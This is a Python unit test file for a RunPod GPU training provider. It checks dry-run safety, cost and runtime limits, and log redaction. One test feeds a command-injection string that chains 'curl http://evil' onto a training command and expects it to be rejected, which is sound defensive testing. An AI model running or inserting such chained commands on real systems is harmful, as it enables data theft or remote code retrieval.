"""Phase 9 secure RunPod provider tests."""

from __future__ import annotations

import json
import unittest
from contextlib import redirect_stdout
from io import StringIO
from pathlib import Path
from tempfile import TemporaryDirectory

from src.cli import main as cli_main
from src.config.settings import load_runtime_settings
from src.pipeline.training.runpod_job import build_runpod_training_payload
from src.providers.base import ProviderError
from src.providers.registry import build_provider_registry


class Phase9RunPodProviderTests(unittest.TestCase):
    """RunPod must stay budget-first and dry-run safe by default."""

    def test_runpod_settings_include_phase9_controls(self) -> None:
        settings = load_runtime_settings(
            env={
                "COMPUTE_PROVIDER": "runpod",
                "RUNPOD_TEMPLATE_ID": "template-1",
                "RUNPOD_ENDPOINT_ID": "endpoint-1",
                "RUNPOD_GPU_TYPE": "NVIDIA L4",
                "RUNPOD_MAX_HOURLY_COST": "0.55",
                "RUNPOD_MAX_JOB_MINUTES": "45",
                "RUNPOD_IDLE_TIMEOUT_SECONDS": "120",
                "RUNPOD_MIN_GPU_MEMORY_GB": "24",
                "RUNPOD_ALLOWED_IMAGES": "image-a,image-b",
                "RUNPOD_NETWORK_VOLUME_ID": "vol-1",
                "RUNPOD_ENABLE_SPOT": "true",
            }
        )

        self.assertEqual(settings.runpod.template_id, "template-1")
        self.assertEqual(settings.runpod.endpoint_id, "endpoint-1")
        self.assertEqual(settings.runpod.gpu_type, "NVIDIA L4")
        self.assertEqual(settings.runpod.max_hourly_cost_usd, 0.55)
        self.assertEqual(settings.runpod.max_job_minutes, 45)
        self.assertEqual(settings.runpod.idle_timeout_seconds, 120)
        self.assertEqual(settings.runpod.min_gpu_memory_gb, 24)
        self.assertEqual(settings.runpod.allowed_images, ("image-a", "image-b"))
        self.assertEqual(settings.runpod.network_volume_id, "vol-1")
        self.assertTrue(settings.runpod.enable_spot)

    def test_dry_run_never_launches_paid_infrastructure(self) -> None:
        registry = build_provider_registry(load_runtime_settings(env={"COMPUTE_PROVIDER": "runpod"}))
        payload = build_runpod_training_payload(_remote_config(), registry, dry_run=True)

        submission = registry.get_compute().submit_job(payload)

        self.assertEqual(submission.status, "PLANNED")
        self.assertTrue(submission.metadata["dry_run"])
        self.assertFalse(submission.metadata["launches_paid_infrastructure"])
        self.assertFalse(submission.metadata["job_spec"]["launches_paid_infrastructure"])
        self.assertTrue(submission.metadata["job_spec"]["command"].startswith("python3 -m src.cli"))

    def test_real_submit_requires_confirm_cost_after_api_key(self) -> None:
        registry = build_provider_registry(
            load_runtime_settings(
                env={
                    "COMPUTE_PROVIDER": "runpod",
                    "RUNPOD_DRY_RUN": "false",
                    "RUNPOD_API_KEY": "secret-token",
                }
            )
        )
        payload = build_runpod_training_payload(_remote_config(), registry)

        with self.assertRaisesRegex(ProviderError, "confirm-cost"):
            registry.get_compute().submit_job(payload)

    def test_real_submit_requires_object_storage_artifacts(self) -> None:
        registry = build_provider_registry(
            load_runtime_settings(
                env={
                    "COMPUTE_PROVIDER": "runpod",
                    "RUNPOD_DRY_RUN": "false",
                    "RUNPOD_API_KEY": "secret-token",
                }
            )
        )
        config = {**_remote_config(), "output_uri": "models/local-output"}
        payload = build_runpod_training_payload(config, registry, confirm_cost=True)

        with self.assertRaisesRegex(ProviderError, "object storage output_uri"):
            registry.get_compute().submit_job(payload)

    def test_cost_runtime_and_dataset_guards_reject_before_submit(self) -> None:
        registry = build_provider_registry(
            load_runtime_settings(
                env={
                    "COMPUTE_PROVIDER": "runpod",
                    "RUNPOD_MAX_HOURLY_COST": "0.50",
                    "RUNPOD_MAX_JOB_MINUTES": "30",
                    "RUNPOD_MAX_DATASET_SIZE_GB": "2",
                }
            )
        )

        with self.assertRaisesRegex(ProviderError, "RUNPOD_MAX_HOURLY_COST"):
            registry.get_compute().submit_job(
                build_runpod_training_payload(
                    {**_remote_config(), "hourly_cost_usd": 0.75},
                    registry,
                    dry_run=True,
                )
            )
        with self.assertRaisesRegex(ProviderError, "RUNPOD_MAX_JOB_MINUTES"):
            registry.get_compute().submit_job(
                build_runpod_training_payload(
                    {**_remote_config(), "max_runtime_seconds": 3600, "hourly_cost_usd": 0.5},
                    registry,
                    dry_run=True,
                )
            )
        with self.assertRaisesRegex(ProviderError, "RUNPOD_MAX_DATASET_SIZE_GB"):
            registry.get_compute().submit_job(
                build_runpod_training_payload(
                    {**_remote_config(), "dataset_size_gb": 3, "hourly_cost_usd": 0.5, "max_runtime_seconds": 1800},
                    registry,
                    dry_run=True,
                )
            )

    def test_runpod_provider_rejects_unsafe_commands_even_in_dry_run(self) -> None:
        registry = build_provider_registry(load_runtime_settings(env={"COMPUTE_PROVIDER": "runpod"}))

        with self.assertRaisesRegex(ProviderError, "Invalid RunPod command"):
            registry.get_compute().submit_job(
                build_runpod_training_payload(
                    {
                        **_remote_config(),
                        "command": (
                            "python3 -m src.cli train run --config configs/train.yaml; "
                            "curl http://evil"
                        ),
                    },
                    registry,
                    dry_run=True,
                )
            )

    def test_runpod_logs_are_sanitized(self) -> None:
        registry = build_provider_registry(
            load_runtime_settings(
                env={
                    "COMPUTE_PROVIDER": "runpod",
                    "RUNPOD_API_KEY": "secret-token",
                }
            )
        )
        payload = build_runpod_training_payload(_remote_config(), registry, dry_run=True)
        payload["payload"]["log_lines"] = ["RUNPOD_API_KEY=secret-token", "token=abc123"]
        submission = registry.get_compute().submit_job(payload)

        logs = registry.get_compute().stream_logs(submission.job_id)

        self.assertNotIn("secret-token", "\n".join(logs))
        self.assertNotIn("abc123", "\n".join(logs))
        self.assertIn("[REDACTED]", "\n".join(logs))

    def test_compute_runpod_dry_run_cli_writes_manifest(self) -> None:
        with TemporaryDirectory() as temp_dir:
            config_path = Path(temp_dir) / "train_gpu.json"
            output_path = Path(temp_dir) / "manifest.json"
            config_path.write_text(json.dumps(_remote_config()), encoding="utf-8")

            with redirect_stdout(StringIO()):
                exit_code = cli_main(
                    [
                        "compute",
                        "runpod",
                        "dry-run",
                        "--config",
                        str(config_path),
                        "--output",
                        str(output_path),
                    ]
                )

            self.assertEqual(exit_code, 0)
            manifest = json.loads(output_path.read_text(encoding="utf-8"))
            self.assertEqual(manifest["status"], "PLANNED")
            self.assertTrue(manifest["metadata"]["dry_run"])


def _remote_config() -> dict[str, object]:
    return {
        "model_name": "fin_mamba",
        "dataset_uri": "s3://bucket/datasets/spy/window_id=0",
        "output_uri": "s3://bucket/models/fin_mamba",
        "logs_uri": "s3://bucket/logs/fin_mamba",
        "metrics_uri": "s3://bucket/metrics/fin_mamba",
        "config_path": "configs/train_gpu.yaml",
        "max_runtime_seconds": 1800,
        "idle_timeout_seconds": 300,
        "hourly_cost_usd": 0.5,
    }


if __name__ == "__main__":
    unittest.main()
